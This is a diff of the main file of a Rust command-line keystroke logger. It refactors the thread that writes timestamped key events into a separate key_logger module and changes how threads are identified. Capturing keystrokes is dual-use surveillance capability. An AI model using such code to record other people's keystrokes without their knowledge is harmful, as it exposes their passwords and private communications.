@@ -1,14 +1,15 @@
 use std::env;
 use std::fs::File;
-use std::io::Write;
 use std::sync::mpsc;
 use std::sync::mpsc::{Receiver, Sender};
-use std::thread;
 
 mod event_listener;
+mod key_logger;
 
 use crate::event_listener::event_listener;
 use crate::event_listener::KeyEvent;
+
+use crate::key_logger::key_logger;
 
 fn main() -> std::io::Result<()> {
     let args: Vec<String> = env::args().collect();
@@ -19,31 +20,19 @@ fn main() -> std::io::Result<()> {
 
     let outputpath = &args[1];
 
-    let mut log_file = File::create(outputpath)?;
+    let log_file = File::create(outputpath)?;
 
     let (tx, rx): (Sender<KeyEvent>, Receiver<KeyEvent>) = mpsc::channel();
 
-    let key_event_threads = event_listener(tx)?;
+    let key_event_threads = event_listener(tx);
 
-    let log_writer_thread = thread::spawn(move || -> std::io::Result<()> {
-        loop {
-            match rx.recv() {
-                Ok(entry) => {
-                    let line = format!("{}, {:?}", entry.time_stamp, entry.key);
-                    writeln!(log_file, "{}", line)?;
-                    println!("{}", line);
-                }
-                Err(e) => {
-                    eprintln!("{}", e);
-                }
-            }
-        }
-    });
+    let log_writer_thread = key_logger(rx, log_file);
 
-    for (i, handle) in key_event_threads.into_iter().enumerate() {
+    for handle in key_event_threads.into_iter() {
+        let id = handle.thread().id();
         match handle.join() {
-            Ok(_) => println!("key_event_thread {} ok", i),
-            Err(e) => eprintln!("key_event_thread {} panicked: {:?}", i, e),
+            Ok(_) => println!("key_event_thread {:?} ok", id),
+            Err(e) => eprintln!("key_event_thread {:?} panicked: {:?}", id, e),
         }
     }
 
